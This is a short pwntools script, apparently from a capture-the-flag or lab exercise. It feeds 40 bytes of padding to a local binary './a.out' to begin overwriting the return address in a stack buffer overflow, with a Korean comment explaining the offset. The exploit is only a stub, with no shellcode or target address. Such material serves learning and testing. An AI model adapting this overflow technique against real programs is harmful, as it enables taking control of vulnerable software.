from pwn import *
payload = b'A' * 40  # buffer (32) + saved EBP (8) + 리턴 주소 덮어쓰기 시작

p = process("./a.out",payload)

p.interactive()